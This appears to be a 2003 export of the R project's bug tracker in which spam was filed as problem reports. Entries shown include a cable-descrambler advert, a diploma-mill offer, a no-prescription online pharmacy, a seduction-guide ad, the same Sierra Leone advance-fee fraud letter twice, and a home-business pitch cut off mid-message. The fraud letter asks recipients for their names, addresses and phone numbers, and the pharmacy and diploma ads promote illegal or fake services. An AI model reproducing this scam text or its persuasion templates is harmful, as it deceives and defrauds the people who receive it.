To: "thisisreallykool" <lb@biostat.ku.dk>
Cc: <p.dalgaard@biostat.ku.dk>, Cc: <sr@biostat.ku.dk>,
   Cc: <pka@biostat.ku.dk>, Cc: <ewa@biostat.ku.dk>,
   Cc: <r-bugs@biostat.ku.dk>
Subject: Re[7]:Are you into the latest gadgets
Date: Thu, 10 Jul 2003 20:52:49 +0200
MIME-Version: 1.0
Content-Type: multipart/alternative;
	boundary="----=_NextPart_6E4_48A5_70A5411A.9B1D4FB5"
X-Priority: 3
X-MSMail-Priority: Normal
X-Mailer: Microsoft Outlook Express 6.00.2800.1106
X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2800.1106

This is a multi-part message in MIME format.

------=_NextPart_6E4_48A5_70A5411A.9B1D4FB5
Content-Type: text/plain;
	charset="us-ascii"
Content-Transfer-Encoding: quoted-printable


------=_NextPart_6E4_48A5_70A5411A.9B1D4FB5
Content-Type: text/html;
	charset="us-ascii"
Content-Transfer-Encoding: base64

PEhUTUw+eTJrMjxwPiZuYnNwOzwvcD4NCjxwPjxGT05UICBTSVpFPTIgUFRTSVpFPTEwIEZBTUlM
WT0iU0FOU1NFUklGIiBGQUNFPSJBcmlhbCIgTEFORz0iMCI+DQo8Qj5EaWdpdGFsIENhYmxlDQpP
cGVuIFBheXBlclZpZXd4PC9CPjxCUj4NCjxCUj4NCipQUFYgY2hhbm5lbHMgPEJSPg0KKkJveGlu
ZyBhbmQgYW55IG90aGVyIFNwb3J0cyBFdmVudCBvbiBQUFYgPEJSPg0KKkE8c3Bhbj5kdTwvc3Bh
bj5sdCBDaGFuPCEtLXdlbGwsIHJyZndlbG5rY3llIG1xb2wgY29tbWVudHMtLT5uZWxzDQo8QlI+
DQoqQW5kIGFueXRoaW5nIGVsc2Ugb24gUFBWIGNoYW5uZWxzIDxCUj4NCjxCUj4NCjxhIGhyZWY9
Imh0dHA6Ly9yZC55YWhvby5jb20vcGFydG5lci9hbnZhcHdhc2tjL292ZXJ0dXJlL2ZpcnN0L09W
PTEvNi8xL2NvbXB1dGVyLypodHRwOi8vd3d3My50aGVkbXMuY29tL2NicHAiPg0KUGxlYXNlIGNs
aWNrIGhlcmUgZm9yIG1vcmUgaW5mb3JtYXRpb248L2E+PEJSPg0KPEJSPg0KVGhpcyBpcyB0aGUg
PHNwYW4gc3R5bGU9J2ZvbnQ6c21hbGwtY2FwcyAxMnB0Jz5uZXdlc3QgYW5kIGJlc3Q8L3NwYW4+
DQo8Qj5EaWdpdGFsPC9CPiBDQVRWIEZpbHRlci9EZXNjcmFtYmxlciA8QlI+DQp0aGF0IGNhbiB0
ZXN0IHlvdXIgPEI+ZGlnaXRhbCBjYWJsZTwvQj4gUFBWIHB1cmNoYXNlIGZ1bmN0aW9ucyA8QlI+
DQphbG9uZyB3aXRoIGVsaW1pbmF0aW5nIHVud2FudGVkIDwhLS1jdXh1Y2xybnJoIHFvLS0+aW50
ZXJmZXJlbmNlDQpjYXVzZWQgYnkgPEJSPg0KeW91ciBicm9hZGJhbmQgY29ubmVjdGlvbi4gVGhp
cyBpcyBhICJUcnVlIiB1bml2ZXJzYWwgPEJSPg0KcHJvZHVjdC4gSXQgd2lsbCB3b3JrIG9uIDk5
JSBvZiBhbGwgPEI+ZGlnaXRhbCBjYWJsZTwvQj4gc3lzdGVtcyA8QlI+DQppbiB1c2UgdG9kYXku
IDxCUj4NCjwvcD4NCjxkaXYgc3R5bGU9J2ZvbnQ6c21hbGwtY2FwcyAxMnB0O3RtcDo3NCc+DQo8
QlI+DQoqKiB2ZXJ5IHNpbXBsZSB0byBob29rIHVwICoqPGJyPg0KPGJyPg0KaWYgeW91IGNhbiBv
cmRlciBwcHYgdGhyb3VnaCB5b3VyIHJlbW90ZSwgdGhlbiB0aGlzIGZpbHRlciA8YnI+DQp3aWxs
IHdvcmsgZm9yIHlvdSB3ZSBvZmZlciB0aGUgbW9zdCBhZHZhbmNlZCB0ZWNobm9sb2d5IGluIDxi
cj4NCjxiPmRpZ2l0YWw8L2I+IGZpbHRlcnMgYW55d2hlcmUsIGRvbnQgYmUgZm9vbGVkIGJ5IGlt
aXRhdGlvbnMgdGhhdCA8YnI+DQp3b250IHdvcmsuIDxicj4NCjxicj4NCmF0dGVudGlvbjo8L2Rp
dj4gQmVjYXVzZSB0aGUgPEI+Q2FibGU8L0I+IENvbXBhbnkgaGFzIG5vIHdheSBvZiB0ZWxsaW5n
DQo8QlI+DQp5b3UgYXJlIHVzaW5nIHRoaXMgcHJvZHVjdCB5b3UgbmVlZCB0byBub3RpZnkgdGhl
bSBvZiBhbnkgPEJSPg0KbW92aWUgcHVyY2hhc2VzIDxCUj4NCjxCUj4NCjxhIGhyZWY9Imh0dHA6
Ly9yZC55YWhvby5jb20vcGFydG5lci9hbnZhcHdhc2tjL292ZXJ0dXJlL2ZpcnN0L09WPTEvNi8x
L2NvbXB1dGVyLypodHRwOi8vd3d3My50aGVkbXMuY29tL2NicHAiPg0KUGxlYXNlIGNsaWNrIGhl
cmUgZm9yIG1vcmUgaW5mb3JtYXRpb248L2E+PC9GT05UPjxwPg0KPGEgaHJlZj0iaHR0cDovL2R2
ZC5lY29tbWVyY2UyMDIwLmNvbS9vayI+UGxlYXNlIGNsaWNrIGhlcmUgdG8gY2Vhc2UgZnV0dXJl
IG9mZmVyczwvYT48L3A+DQo8cD46LSkpPC9wPg0KDQo8L0hUTUw+

------=_NextPart_6E4_48A5_70A5411A.9B1D4FB5--

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 3449 *
Subject: Finally earn respect with your own MBA gjfh
From: "Bennie Petersen" <jethro877599961@hairdresser.net>
Date: Thu, 10 Jul 03 17:59:10 GMT
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 3449 <==
From jethro877599961@hairdresser.net Thu Jul 10 10:09:02 2003
Received: from lsanca1-ar44-4-33-097-069.lsanca1.dsl-verizon.net (lsanca1-ar44-4-33-097-069.lsanca1.dsl-verizon.net [4.33.97.69])
	by pubhealth.ku.dk (8.12.9/8.12.9) with SMTP id h6A88iJH016741;
	Thu, 10 Jul 2003 10:08:52 +0200 (MET DST)
Received: from sm.x1ye.org ([239.240.94.202]) by lsanca1-ar44-4-33-097-069.lsanca1.dsl-verizon.net with ESMTP id 62D2DA32A5E; Thu, 10 Jul 2003 17:59:10 -0300
Message-ID: <x$z-f-$$jqi-w$i@1xw.1ymt>
From: "Bennie Petersen" <jethro877599961@hairdresser.net>
To: ce@biostat.ku.dk
Cc: <p.dalgaard@biostat.ku.dk>, <r-bugs@biostat.ku.dk>
Subject: Finally earn respect with your own MBA gjfh
Date: Thu, 10 Jul 03 17:59:10 GMT
X-Mailer: Microsoft Outlook, Build 10.0.2627
MIME-Version: 1.0
Content-Type: multipart/alternative;
	boundary="66E9F1F6356"
X-Priority: 3
X-MSMail-Priority: Normal

This is a multi-part message in MIME format.

--66E9F1F6356
Content-Type: text/html;
Content-Transfer-Encoding: quoted-printable

<HTML><HEAD><TITLE></TITLE>=0A<BODY bgColor=3D#ffffff topMargin=3D0>=0A<DI=
V align=3Dcenter><BR>=0A<TABLE borderColor=3D#000000 cellSpacing=3D0 cellP=
adding=3D2 width=3D650 border=3D1>=0A  <TBODY>=0A  <TR>=0A    <TD>=0A     =
 <TABLE cellSpacing=3D0 cellPadding=3D4 width=3D650 align=3Dcenter
border=3D=
0>=0A        <TBODY>=0A        <TR>=0A          <TD bgColor=3D#003366><FON=
T face=3D"Arial, Helvetica, sans-serif" =0A            color=3D#ffffff siz=
e=3D2>. U N I V E R S I T Y . D I P L O M A S =0A          .</FONT></TD></=
TR>=0A        <TR>=0A          <TD vAlign=3Dcenter bgColor=3D#000000 heigh=
t=3D40>=0A            <DIV align=3Dcenter><FONT face=3D"Verdana, Arial, He=
lvetica, sans-serif" =0A            color=3D#ffffff size=3D2><I>Do you wan=
t for a prosperous future, =0A            increased money earning power, a=
nd the respect of =0A            all?</I><BR></FONT></DIV></TD></TR>=0A   =
     <TR>=0A          <TD bgColor=3D#cc0033>=0A            <DIV align=3Dce=
nter>=0A            <P><B><I><FONT face=3D"Verdana, Arial, Helvetica, sans=
-serif" =0A            size=3D2>We can assist with Diplomas from prestigio=
us non-accredited =0A            universities based on your present knowle=
dge and life =0A            experience.</FONT></I></B></P></DIV></TD></TR>=
=0A        <TR>=0A          <TD background=3D"">=0A            <DIV
align=3D=
center><FONT face=3D"Verdana, Arial, Helvetica, sans-serif" =0A           =
 size=3D3><BR><B><FONT color=3D#ff0000>No required tests, classes, books, =
=0A            or interviews.</FONT></B></FONT> </DIV>=0A            <P al=
ign=3Dleft><FONT face=3D"Verdana, Arial, Helvetica, sans-serif" =0A       =
     size=3D3><I>Bachelors, masters, MBA, and doctorate (PhD) diplomas =0A=
            available in the field of your choice - that's right, you can =
become =0A            a Doctor and receive all the benefits and admiration=
 that comes with =0A            it!</I></FONT></P>=0A            <P
align=3D=
center><FONT face=3D"Verdana, Arial, Helvetica, sans-serif" =0A           =
 size=3D3><B><FONT color=3D#0000ff size=3D5>No one is turned =0A          =
  down.</FONT></B></FONT></P>=0A            <P align=3Dcenter><FONT
face=3D=
"Verdana, Arial, Helvetica, sans-serif" =0A            size=3D3><I>Confide=
ntiality assured</I></FONT><BR><BR></P></TD></TR>=0A        <TR>=0A       =
   <TD bgColor=3D#000000>=0A            <DIV align=3Dcenter>=0A           =
 <P><FONT face=3D"Arial, Helvetica, sans-serif" color=3D#ffffff =0A       =
     size=3D2><BR>CALL US&nbsp; 24 HOURS A DAY, 7 DAYS&nbsp; A =0A        =
    WEEK</FONT></P>=0A            <P><FONT face=3D"Arial, Helvetica, sans-=
serif" color=3D#ffffff =0A            size=3D2>&nbsp; <FONT size=3D1>(incl=
uding Sundays and =0A            holidays):</FONT></FONT></P>=0A          =
  <P><FONT face=3D"Arial, Helvetica, sans-serif" color=3D#ffffff =0A      =
      size=3D2><B><FONT size=3D5>1-415-366-1508</FONT></B> </FONT><FONT
=0A=
            face=3D"Arial, Helvetica, sans-serif" color=3D#ffffff =0A     =
       size=3D5><BR></B></FONT></P></DIV></TD></TR>=0A        <TR>=0A     =
     <TD bgColor=3D#003366>=0A            <DIV align=3Dcenter><FONT
face=3D=
"Arial, Helvetica, sans-serif" =0A            color=3D#ffffff size=3D2><B>=
Contact us NOW to receive your diploma =0A            within days, and sta=
rt improving your =0A        life!</B></FONT></DIV></TD></TR></TBODY></TAB=
LE></TD></TR></TBODY></TABLE></DIV></BODY></HTML>=0A
Stop Mailings <A HREF=3D"http://www.getoffmylist.com/remove.html">HERE</A>=
ta vkbaunwfjrixbdpkrtvxlspr knedv qahvnal
iskf x
xucoktxcb pe liqbfbb i

--66E9F1F6356--

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 3450 *
Subject: On-line Pharmacy - Zyban - Shipped Overnight! ydu wye 
From: "Tad Werner" <vukxkm@yahoo.com>
Date: Thu, 10 Jul 03 23:24:39 GMT
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 3450 <==
From vukxkm@yahoo.com Thu Jul 10 10:18:43 2003
Received: from home-05094.b.astral.ro (home-05094.b.astral.ro [193.231.180.253])
	by pubhealth.ku.dk (8.12.9/8.12.9) with SMTP id h6A8IAJH016892
	for <r-bugs@biostat.ku.dk>; Thu, 10 Jul 2003 10:18:27 +0200 (MET DST)
Received: from jfnj.lxbb.net (HELO kssj3o) [169.246.186.186] by home-05094.b.astral.ro; Thu, 10 Jul 2003 23:24:39 -0100
Message-ID: <p058302o45y23wj8-rg307@q7fy3.w.p.zl>
From: "Tad Werner" <vukxkm@yahoo.com>
Reply-To: "Tad Werner" <vukxkm@yahoo.com>
To: <r-bugs@biostat.ku.dk>
Subject: On-line Pharmacy - Zyban - Shipped Overnight! ydu wye 
Date: Thu, 10 Jul 03 23:24:39 GMT
X-Mailer: Microsoft Outlook, Build 10.0.2627
MIME-Version: 1.0
Content-Type: multipart/alternative;
	boundary="06__F8F39BA_7"
X-Priority: 1
X-MSMail-Priority: High


--06__F8F39BA_7
Content-Type: text/html;
Content-Transfer-Encoding: quoted-printable

<html>

<head>
<title>New Page 1</title>
<meta name=3D"GENERATOR" content=3D"Microsoft FrontPage 3.0">
</head>

<body>
<font color=3D"#ffffff" size=3D"1">

<p>Order Confirmation. Your order should be shipped by January, via FedEx.=
 Your Federal
Express track</font> </p>

<p align=3D"center"><font face=3D"Arial" size=3D"6"><font size=3D"5">Did y=
ou know you can&nbsp;get
prescription medications prescribed online with</font> <strong><font color=
=3D"#ff0000"><br>
NO PRIOR PRESCRIPTION REQUIRED<br>
<br>
<font color=3D"#0033cc" size=3D"4"><a href=3D"http://www.adulterate@beam=
to/great.news">ORDER BY
2:00 EST AND GET YOUR ORDER THE NEXT DAY</a></font></font></strong></font>=
</p>

<p align=3D"center"><font face=3D"Arial, Helvetica, sans-serif"><br>
<strong><a href=3D"http://www.fume@beam.to/great.news">Lowest Pric=
es &#150; No Prior
Prescription Required<br>
</a></strong></font></p>

<p align=3D"center"><font face=3D"Arial, Helvetica, sans-serif">Upon Appro=
val, <strong>Our <font
color=3D"#ff0000">US Licensed Doctors</font> will Prescribe Your Medicatio=
n For <font
color=3D"#ff0000">Free</font></strong><br>
And Have the Medication<strong> Shipped Overnight To Your Door.</strong></=
font></p>

<p align=3D"center"><font face=3D"Arial, Helvetica, sans-serif"><strong><a=

href=3D"http://www.madam@beam.to/great.news">We assure you the abso=
lute best value on the
Internet</a></strong></font></p>

<p align=3D"center"><font face=3D"Arial, Helvetica, sans-serif"><strong>Me=
dications for: </strong>Weight
Loss, Pain Relief, Muscle Pain Relief, Women's Health, Men's Health, <br>
Impotence, Allergy Relief, Heartburn Relief, Migraine Relief</font></p>

<p align=3D"center"><font face=3D"Arial, Helvetica, sans-serif"><strong>Me=
dications like: </strong>Phentermine,
Adipex, Soma, Fioricet, Ultram, Celebrex,<br>
Viagra, Valtrex, Zyban, and many, many more.</font></p>

<p align=3D"center"><font face=3D"Arial, Helvetica, sans-serif"><strong><a=

href=3D"http://www.bore@beam.to/great.news">Click Here</a><br>
</strong></font></p>

<p align=3D"center"><small>To purge your e-mail address from our database:=
<br>
<a
href=3D"http://www.medcabinet.biz/adios.php">Click
Here</a><br>
</small><font face=3D"Arial, Helvetica, sans-serif"><strong></strong></fon=
t></p>
</body>
</html>
ifvoic
 bul ow
kjxrj fodvfesztokx yj qmi dkn lnhtd
jktvhnku
zzwypjp j

--06__F8F39BA_7--

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 3451 *
Subject: Learn to get any woman you want
From: "Lillian Singleton" <ede9rzr4hi0@aei.ca>
Date: Thu, 10 Jul 03 16:44:41 GMT
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 3451 <==
From ede9rzr4hi0@aei.ca Thu Jul 10 13:51:40 2003
Received: from h00e0186cd0b2.ne.client2.attbi.com (h00e0186cd0b2.ne.client2.attbi.com [24.34.63.15])
	by pubhealth.ku.dk (8.12.9/8.12.9) with SMTP id h6ABpaJH019392;
	Thu, 10 Jul 2003 13:51:37 +0200 (MET DST)
Received: from i8s.mwrrz4.net (HELO aq9vopz) [244.21.191.197] by h00e0186cd0b2.ne.client2.attbi.com SMTP id 61MUxvbq9d79Xq; Thu, 10 Jul 2003 16:44:41 +0500
Message-ID: <edh0$$ne$$2juxe0@9xb9p543f.ht>
From: "Lillian Singleton" <ede9rzr4hi0@aei.ca>
To: p.dalgaard@biostat.ku.dk
Cc: <r-bugs@biostat.ku.dk>, <sr@biostat.ku.dk>
Subject: Learn to get any woman you want
Date: Thu, 10 Jul 03 16:44:41 GMT
X-Mailer: MIME-tools 5.503 (Entity 5.501)
MIME-Version: 1.0
Content-Type: multipart/alternative;
	boundary="2B_AD__8F_B.BAFDB.81_.F"
X-Priority: 3
X-MSMail-Priority: Normal

This is a multi-part message in MIME format.

--2B_AD__8F_B.BAFDB.81_.F
Content-Type: text/html;
Content-Transfer-Encoding: quoted-printable

<html><head><title>Secrets Of A Sex Magnet</title></head><body bgcolor=3DF=
FFFFF>
<table width=3D"472" border=3D"1" height=3D"330" bordercolor=3D"#FF0000" c=
ellspacing=3D"0" cellpadding=3D"0" align=3D"left">
  <tr> 
    <td height=3D"41" bgcolor=3D"#003399"> 
      <div align=3D"center"><font color=3D"#FFFFFF"><b><font size=3D"3" fa=
ce=3D"Arial, Helvetica, sans-serif">PROVEN 
        Techniques And Tactics For Seducing Only<br>
        The HOTTEST Women Into Your Bed?!</font></b> </font></div>
    </td>
  </tr>
  <tr> 
    <td> 
      <p><font face=3D"Arial, Helvetica, sans-serif" color=3D"#FFFFFF"><br=
>
        ....................</font><font face=3D"Arial, Helvetica, sans-se=
rif" color=3D"#FFFFFF">.....</font><font face=3D"Arial, Helvetica, sans-se=
rif">Imagine...</font> 
      <p align=3D"center"><font face=3D"Arial, Helvetica, sans-serif">Each=
 time you 
        go out for a night on the town, you'll come<br>
        home with a beautiful &quot;babe&quot; in your arms only to discov=
er<br>
        that <b>up to 10 messages </b>from other beautiful women,<br>
        desperate to meet you or begging to go out<br>
        with you, are waiting <b>on your answering machine!</b></font></p>=

      <div align=3D"center"></div>
      <ul>
        <li> 
          <p align=3D"center"><b><font face=3D"Arial, Helvetica, sans-seri=
f">Learn 
            Where To Meet Women!</font></b> 
        </li>
        <li> 
          <p align=3D"center"><b><font face=3D"Arial, Helvetica, sans-seri=
f">Guaranteed 
            Conversation Starters!</font></b> 
        </li>
        <li> 
          <p align=3D"center"><b><font face=3D"Arial, Helvetica, sans-seri=
f">Multiple 
            Women At Your Disposal!</font></b> 
        </li>
        <li> 
          <p align=3D"center"><b><font face=3D"Arial, Helvetica, sans-seri=
f">Secrets 
            Of Undressing A Woman Smoothly!<br>
            And Much More!</font></b> 
        </li>
      </ul>
      <p align=3D"center"><font face=3D"Arial, Helvetica, sans-serif"><a h=
ref=3D"http://www.seduceherfast.com/seduction/seducefast.html"><b>Click 
        here to learn the secrets of seducing women!</b></a></font></p>
      <p align=3D"center">&nbsp;</p>
    </td>
  </tr>
  <tr> 
    <td bgcolor=3D"#003399"> 
      <div align=3D"center"><font face=3D"Arial, Helvetica, sans-serif" si=
ze=3D"2"><b><font color=3D"#FFFFFF">To 
        stop notifications</font><font color=3D"#33CCFF">, <a href=3D"http=
://www.reggiesroad.biz/%20"><font color=3D"#CCCCCC">click 
        here</font></a></font></b></font></div>
    </td>
  </tr>
</table>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>.</p>
<p>&nbsp;
</body></html>
j nwxhytka mm 
ufv xd bl  hehyse

--2B_AD__8F_B.BAFDB.81_.F--

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 3452 *
Subject: From Mrs. COLEMAN.
From: "Mrs.Coleman" <m_mumu@mulumobutu.com>
Date: 10 Jul 2003 12:14:17 -0000
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 3452 <==
From m_mumu@mulumobutu.com Thu Jul 10 14:23:19 2003
Received: from mail.rediffmailpro.com (f1mail.rediffmailpro.com [203.199.83.211])
	by pubhealth.ku.dk (8.12.9/8.12.9) with SMTP id h6ACNDJH019754
	for <r-bugs@biostat.ku.dk>; Thu, 10 Jul 2003 14:23:14 +0200 (MET DST)
Received: (qmail 29154 invoked by uid 510); 10 Jul 2003 12:14:17 -0000
Date: 10 Jul 2003 12:14:17 -0000
Message-ID: <20030710121417.29150.qmail@mail.rediffmailpro.com>
Received: from unknown (145.53.47.42) by rediffmail.com via HTTP; 10 Jul 2003 12:14:17 -0000
MIME-Version: 1.0
From: "Mrs.Coleman" <m_mumu@mulumobutu.com>
Reply-To: "Mrs.Coleman" <m_mumu@mulumobutu.com>
To: m_mumu@mulumobutu.com
Subject: From Mrs. COLEMAN.
Content-type: text/plain;
	charset=iso-8859-1
Content-Disposition: inline
Content-Transfer-Encoding: 8bit
X-MIME-Autoconverted: from quoted-printable to 8bit by pubhealth.ku.dk id h6ACNDJH019754


Dear friend,
I am Mrs. Becky Coleman wife to the late Chife Paul Coleman from 
Sierra Leon. I am writing you in absolute confidence primarily to seek 
your assistance to transfer our cash of thirty  Million Dollars 
($30,000.000.00) now in the custody of a private Security trust firm in Europe 
the money is in trunk boxes
deposited and declared as Precious stones by my late Husband as a 
matter of fact the company does not know the content as money, although my 
husband made them to under stand that the boxes belongs to his foreign partner.
Source of the money:
My late Husband Chief Paul Coleman , a native of  Mende District in 
the Northerh province of Sierra Leone, was the General Manager of Sierra 
Leone Mining co-operation (S.L.M.C.) Freetown . According to my 
Husband, this money was the income accrued from Mining Co-operation's over draft and minor sales. 
Before the peak of the civil war between the rebels forces of Major 
Paul Koroma and the combined forces of ECOMOG peace keeping operation that 
almost destroyed my country, following the forceful removal from power 
of the civilian elected President Ahmed Tejan Kabbah by the rebels. My 
Husband had already made arrangement for  I and my two children to be 
evacuated to Ivory coast with the CERTIFICATE OF DEPOSIT  he made with a 
security firm in Europe through the aid of U.N evacuation team. 
During the war in my country, and following the indiscriminate looting 
of Public and Government properties by the rebel forces, the Sierra Leone
mining coop. Was one of the target looted and it was destroyed. My 
husband including other top Government functionaries were attaked and 
killed by the rebels in November 2000 because of his relationship with the 
civilian Government of Ahmed Tejan Kabbah.
As a result of my husbands's death , and with the information we got 
that the rebelsa are out for us the burden became too much for me to 
handle coupled with the ill health of my dauther she died in the process as 
i could not afford her a decent medical care.
Our only hope now is in you and the boxes deposited in the Security Firm
To this effect, I humbly solicit your assistance in the followings ways.
1. to assist me claim this boxes from the security
  Firm as our beneficiary
2. to transfer this money (USD$30M) in your name to your country
3. to make a good arrangement for a joint business investment on our 
behalf in your country and you, our Adviser/ Manager

For your assistance, I have agreed with my only surviving son that 20% 
of the total amount will be for your effort and another 10 % to cover all the expenses
that may incur during the business transaction, Last, I urge you to 
keep this transaction strictly confidential as no one knows our where about.
Please as you show your willingness, Forward to us your full name, 
address and Tel/ Fax numbers, to me via my private email address as 
indicated bellow, this is for security reasons as i will  only be accessing my 
private email earnestly awaiting your response.

Thanks.
May God bless you as you assist us.
Mrs. BECKY COLEMAN.
PS.
PLEASE NOTE THAT ANY RESPONSE FROM YOU IN CASE YOU ARE INTERESTED TO HELP ME SHOULD BE SENT TO MY MORE PRIVATE EMAIL ADDRESS:becky23jj@netscape.net.


PLEASE REPLY TO MY ADDRESS STATED ABOVE AS I WILL NOT SEE YOUR MESSAGE WHEN SENT TO THE ACCOUNT I HAVE USED TO INFORM YOU OF MY PLIGHT AND SOLICIT YOUR ASSISTANCE.



~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 3453 *
Subject: From Mrs. COLEMAN.
From: "Mrs.Coleman" <m_mumu@mulumobutu.com>
Date: 10 Jul 2003 13:03:40 -0000
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 3453 <==
From m_mumu@mulumobutu.com Thu Jul 10 15:46:31 2003
Received: from mail.rediffmailpro.com (f1mail.rediffmailpro.com [203.199.83.211])
	by pubhealth.ku.dk (8.12.9/8.12.9) with SMTP id h6ADkTJH020624
	for <r-bugs@biostat.ku.dk>; Thu, 10 Jul 2003 15:46:30 +0200 (MET DST)
Received: (qmail 7828 invoked by uid 510); 10 Jul 2003 13:03:40 -0000
Date: 10 Jul 2003 13:03:40 -0000
Message-ID: <20030710130340.7825.qmail@mail.rediffmailpro.com>
Received: from unknown (145.53.47.42) by rediffmail.com via HTTP; 10 Jul 2003 13:03:40 -0000
MIME-Version: 1.0
From: "Mrs.Coleman" <m_mumu@mulumobutu.com>
Reply-To: "Mrs.Coleman" <m_mumu@mulumobutu.com>
To: m_mumu@mulumobutu.com
Subject: From Mrs. COLEMAN.
Content-type: text/plain;
	charset=iso-8859-1
Content-Disposition: inline
Content-Transfer-Encoding: 8bit
X-MIME-Autoconverted: from quoted-printable to 8bit by pubhealth.ku.dk id h6ADkTJH020624


Dear friend,
I am Mrs. Becky Coleman wife to the late Chife Paul Coleman from 
Sierra Leon. I am writing you in absolute confidence primarily to seek 
your assistance to transfer our cash of thirty  Million Dollars 
($30,000.000.00) now in the custody of a private Security trust firm in Europe 
the money is in trunk boxes
deposited and declared as Precious stones by my late Husband as a 
matter of fact the company does not know the content as money, although my 
husband made them to under stand that the boxes belongs to his foreign partner.
Source of the money:
My late Husband Chief Paul Coleman , a native of  Mende District in 
the Northerh province of Sierra Leone, was the General Manager of Sierra 
Leone Mining co-operation (S.L.M.C.) Freetown . According to my 
Husband, this money was the income accrued from Mining Co-operation's over draft and minor sales. 
Before the peak of the civil war between the rebels forces of Major 
Paul Koroma and the combined forces of ECOMOG peace keeping operation that 
almost destroyed my country, following the forceful removal from power 
of the civilian elected President Ahmed Tejan Kabbah by the rebels. My 
Husband had already made arrangement for  I and my two children to be 
evacuated to Ivory coast with the CERTIFICATE OF DEPOSIT  he made with a 
security firm in Europe through the aid of U.N evacuation team. 
During the war in my country, and following the indiscriminate looting 
of Public and Government properties by the rebel forces, the Sierra Leone
mining coop. Was one of the target looted and it was destroyed. My 
husband including other top Government functionaries were attaked and 
killed by the rebels in November 2000 because of his relationship with the 
civilian Government of Ahmed Tejan Kabbah.
As a result of my husbands's death , and with the information we got 
that the rebelsa are out for us the burden became too much for me to 
handle coupled with the ill health of my dauther she died in the process as 
i could not afford her a decent medical care.
Our only hope now is in you and the boxes deposited in the Security Firm
To this effect, I humbly solicit your assistance in the followings ways.
1. to assist me claim this boxes from the security
  Firm as our beneficiary
2. to transfer this money (USD$30M) in your name to your country
3. to make a good arrangement for a joint business investment on our 
behalf in your country and you, our Adviser/ Manager

For your assistance, I have agreed with my only surviving son that 20% 
of the total amount will be for your effort and another 10 % to cover all the expenses
that may incur during the business transaction, Last, I urge you to 
keep this transaction strictly confidential as no one knows our where about.
Please as you show your willingness, Forward to us your full name, 
address and Tel/ Fax numbers, to me via my private email address as 
indicated bellow, this is for security reasons as i will  only be accessing my 
private email earnestly awaiting your response.

Thanks.
May God bless you as you assist us.
Mrs. BECKY COLEMAN.
PS.
PLEASE NOTE THAT ANY RESPONSE FROM YOU IN CASE YOU ARE INTERESTED TO HELP ME SHOULD BE SENT TO MY MORE PRIVATE EMAIL ADDRESS:becky23jj@netscape.net.


PLEASE REPLY TO MY ADDRESS STATED ABOVE AS I WILL NOT SEE YOUR MESSAGE WHEN SENT TO THE ACCOUNT I HAVE USED TO INFORM YOU OF MY PLIGHT AND SOLICIT YOUR ASSISTANCE.



~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 3454 *
Subject: Here's A Quick WAy To Make OVer $1,300 Per Month In No Time! apcn shybcousyo
From: "Emily Paige" <to5q0nvvunn@frindz.net>
Date: Fri, 11 Jul 03 12:55:01 GMT
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 3454 <==
From to5q0nvvunn@frindz.net Fri Jul 11 04:59:16 2003
Received: from 192.38.18.10 (CacheFlowServer@[61.235.164.2])
	by pubhealth.ku.dk (8.12.9/8.12.9) with SMTP id h6B2xAJH024359;
	Fri, 11 Jul 2003 04:59:14 +0200 (MET DST)
Received: from fuk.2zzfp.com ([241.55.206.180]) by 192.38.18.10 with ESMTP id 331ADCBEEA0 for <r-bugs@biostat.ku.dk>; Fri, 11 Jul 2003 12:55:01 -0300
Message-ID: <v3$$88gog$nx013@7hl.9sw.d.b.4z>
From: "Emily Paige" <to5q0nvvunn@frindz.net>
To: r-bugs@biostat.ku.dk
Cc: <p.dalgaard@biostat.ku.dk>
Subject: Here's A Quick WAy To Make OVer $1,300 Per Month In No Time! apcn shybcousyo
Date: Fri, 11 Jul 03 12:55:01 GMT
X-Priority: 1
X-MSMail-Priority: High
X-Mailer: Microsoft Outlook, Build 10.0.2627
MIME-Version: 1.0
Content-Type: multipart/alternative;
	boundary="6C6CD.75.B_3"

This is a multi-part message in MIME format.

--6C6CD.75.B_3
Content-Type: text/html
Content-Transfer-Encoding: quoted-printable

<DIV>
<DIV>
<DIV><STRONG><FONT color=3D#407f00>Mom's helpling Moms!<BR>(Dad's welcome =
too!)</FONT></STRONG></DIV>
<DIV>&nbsp;</DIV>
<DIV><STRONG><FONT color=3D#347d7e>Finally an easy home based business!</F=
ONT></STRONG></DIV>
<DIV>&nbsp;</DIV>
<DIV><STRONG><FONT color=3D#347d7e>How can you build a home business when =
you</FONT></STRONG></DIV>
<DIV><STRONG><FONT color=3D#347d7e>are trying to run a household or workin=
g full time?</FONT></STRONG></DIV>
<DIV>&nbsp;</DIV>
<DIV><STRONG><FONT color=3D#347d7e>Simple...Let us do it for you!</FONT></=
STRONG></DIV>
<DIV><STRONG><FONT color=3D#347d7e></FONT></STRONG>&nbsp;</DIV>
<DIV><STRONG><FONT color=3D#347d7e>* We do all the selling and recruiting!=
</FONT></STRONG></DIV>
<DIV><STRONG><FONT color=3D#347d7e>* You never talk to anyone if you don't=
 want to!<BR>* All you have to do is sign up and buy products you are <BR>=
&nbsp; already using!</FONT></STRONG></DIV>
<DIV>&nbsp;</DIV>
<DIV><STRONG><FONT color=3D#347d7e>Could you use an extra $1,300&nbsp; or =
